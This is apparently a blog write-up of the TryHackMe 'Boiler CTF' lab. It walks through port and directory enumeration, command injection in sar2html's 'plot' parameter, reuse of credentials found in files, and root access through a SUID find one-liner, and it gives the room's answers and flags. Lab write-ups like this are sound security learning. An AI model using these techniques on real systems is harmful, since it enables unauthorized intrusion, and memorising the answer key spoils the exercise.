---
layout: post
title: Boiler CTF
date: 2022-12-30 12:00 +0700
categories: [THM, medium]
---

### Introduction

[Boiler CTF] is a medium CTF on TryHackMe focus in enumeration.

![Boiler CTF](https://tryhackme-images.s3.amazonaws.com/room-icons/4a800c6513239dbdfaf74ce869a88add.jpeg)


---

Let's start scanning the machine with nmap.
Like we can see in the scan, it returns, 4 open ports.

```sh
nmap -sSV -p- --open --min-rate 5000 <IP> -oN <outputfile.txt>
```

![scan](/images/THM/boilerctf/Captura.PNG)

We're going to try to connect to ftp with the anonymous user.

```sh
ftp <ip>
```

Inside FTP we can see the file called **.info.txt**, so we download it.


![ftp](/images/THM/boilerctf/Captura1.PNG)

- File extension after anon login
>Answer: txt

- What is on the highest port?
>Answer: ssh

Let's see what is the content of the file. It returns a phrase, and It seems to be in ROT13.

```sh
cat .info.txt
```

![cat](/images/THM/boilerctf/Captura4.PNG)

If we go to [CyberChef] we can decode the phrase.
It remembers us to keep enumerating.

![cyberchef](/images/THM/boilerctf/Captura5.PNG)

If we go to the http in the port 10000 we can see a Webmin login panel.

![webmin](/images/THM/boilerctf/Captura2.PNG)

- What's running on port 10000?
>Answer: webmin

- Can you exploit the service running on that port? (yay/nay answer)
>Answer: nay

And if we go to the standard http port, we find an apache2 default page.

![apache](/images/THM/boilerctf/Captura3.PNG)

Time to find out directories using [Gobuster].

```sh
gobuster dir -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t <threads> -x <extensions>
```

We got 3 results.

![gobuster](/images/THM/boilerctf/Captura6.PNG)

If we see **robots.txt**, we see some weird numbers. It could be ascii code, so let's decode it to text.

![robots](/images/THM/boilerctf/Captura7.PNG)

It returned more weird characters, so possibly is base64.

![ascii](/images/THM/boilerctf/Captura8.PNG)

When base64 is decoded, a md5 hash is revealed.

```sh
echo "<base64 code>" | base64 -d
```

![base64](/images/THM/boilerctf/Captura9.PNG)

To crack the md5 hash I used [CrackStation] which is an online page for cracking hashes.
But the hash cracked says kidding, so in fact is nothing interesting.

![md5](/images/THM/boilerctf/Captura10.PNG)

Let's move on to joomla directory.
Here we can see the CMS Joomla.

![joomla](/images/THM/boilerctf/Captura11.PNG)

- What's CMS can you access?
>Answer: joomla

Like in the file **.info.txt** said, let's keep enumerating.

This time, we will use the **common.txt** wordlist.

```sh
gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt -q -t <threads> -x <extensions>
```

![cyberchef](/images/THM/boilerctf/Captura12.PNG)

There are a lot of results, but the interesting one is the folder **_test** which contains sar2html.

Sar2html is the system statistics (sar data) plotting tool for a number of operating systems.

![cyberchef](/images/THM/boilerctf/Captura13.PNG)

If we research a little, we can find a [RCE exploit] for it.

![cyberchef](/images/THM/boilerctf/Captura14.PNG)

The exploit consists of type the command in the URL right in the variable **plot** starting with the ";" and followed for the command.

If we list the directory, we can see a file with the name **log.txt**.

![cyberchef](/images/THM/boilerctf/Captura15.PNG)

- The interesting file name in the folder?
>Answer: log.txt


Now is time to see the content of the file, and we got the credentials of the user **basterd**.

![cyberchef](/images/THM/boilerctf/Captura16.PNG)

It's time to connect to the machine with the credentials we got.

```sh
ssh basterd@<IP> -p 55007
```

When We're in, we can upgrade our simple shell to an interactive shell with the following command:

```sh
python -c "import pty;pty.spawn('<shell>')"
```

![cyberchef](/images/THM/boilerctf/Captura17.PNG)

Let's show directory content and we can find a file called **backup.sh**.

```sh
ls -la
```

If we see the content, we can find another user named stoner and his password.

```sh
cat backup.sh | more
```

![cyberchef](/images/THM/boilerctf/Captura18.PNG)

- Where was the other users pass stored(no extension, just the name)?
>Answer: backup

Time to log in with stoner.

```sh
su stoner
```

![cyberchef](/images/THM/boilerctf/Captura19.PNG)

If we go to his home directory, we find a **.secret** which contains the user flag.

```sh
cd /home/stoner
ls -la
cat .secret
```

![cyberchef](/images/THM/boilerctf/Captura20.PNG)

- user.txt
>Answer: You made it till here, well done.

It's time to elevate our privileges so If we search for suid binaries we can see the **find** binary.

```sh
find / -perm /4000 -type f 2>/dev/null
```

![cyberchef](/images/THM/boilerctf/Captura21.PNG)

We can use these permissions to elevate our privileges. If we don't know how to do this, we can search it in [GTFOBins].

```sh
/usr/bin/find . -exec <shell> -p \; -quit
```

![cyberchef](/images/THM/boilerctf/Captura22.PNG)

- What did you exploit to get the privileged user?
>Answer: find

Being root, now we can go to root directory and show the root flag.

```sh
cd /root
ls -la
cat root.txt
```

![cyberchef](/images/THM/boilerctf/Captura23.PNG)

And with this we've finished the machine.

- root.txt
>Answer: It wasn't that hard, was it?


  [Boiler CTF]: https://tryhackme.com/room/boilerctf2
  [Cyberchef]: https://gchq.github.io/CyberChef/
  [gobuster]: https://github.com/OJ/gobuster
  [RCE exploit]: https://www.exploit-db.com/exploits/47204
  [crackstation]:https://crackstation.net/
  [GTFOBins]:[GTFOBins]:https://gtfobins.github.io/
